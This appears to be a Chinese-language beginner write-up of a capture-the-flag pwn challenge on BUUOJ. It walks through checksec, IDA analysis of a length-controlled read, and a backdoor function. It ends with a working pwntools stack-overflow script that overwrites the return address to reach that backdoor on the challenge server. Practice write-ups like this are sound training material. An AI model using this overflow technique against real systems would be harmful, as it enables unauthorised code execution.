**新手上路，欢迎交流指错**

先checksec一下

<img width="656" height="177" alt="屏幕截图 2026-05-25 211407" src="https://github.com/user-attachments/assets/0291245c-29f3-4712-8cc6-c034d2b7599f" />

发现开了NX栈堆不可执行，并且是64位程序

再IDA分析，发现逻辑其实很简单，就是程序问了名字的长度，并把长度当作read的长度参数

<img width="765" height="413" alt="屏幕截图 2026-05-25 211724" src="https://github.com/user-attachments/assets/9261d26c-7287-4f25-b94f-d55c71161a48" />

根据IDA分析的 _BYTE buf[12]; // [rsp+0h] [rbp-10h] 我们可以知道缓冲区大小是 0x10(16B) 
  

> [!NOTE]那么难道我们只需要保证输入数字大于 32(16+8+8)就行了吗?
>
> 很明显，不行，别问我为什么知道的
>
> 计算的虽然确实是理论最小值，但还有可能有其原本就有的数据、对齐、额外局部变量，所以要留出一定冗余

再看看左侧，发现惊喜后门函数 backdoor，即刻点击进入

<img width="930" height="524" alt="屏幕截图 2026-05-25 212501" src="https://github.com/user-attachments/assets/71c1ebf2-ace5-4043-8e07-b126c2ff8bf2" />

果真不错

>  [!IMPORTANT]
> 构造payload时，注意p32(p64)用于要把一个地址或数字按照正确字节序塞进内存（也就是转换成小端序）
> 
> 而b""用于传字符串/已确定字节序/shellcode的时候

以下是构造的脚本

```python
from pwn import *
r=remote("node5.buuoj.cn",28680)

backdoor=0x4006E6

payload1=b"50"
payload2=b"A"*24+p64(backdoor)

r.sendlineafter("Please input the length of your name:",payload1)
r.sendlineafter("What's u name?",payload2)

r.interactive()
```

成功拿到flag

<img width="630" height="151" alt="image" src="https://github.com/user-attachments/assets/0940443f-60b1-4365-bc52-a56fe4f00dc0" />
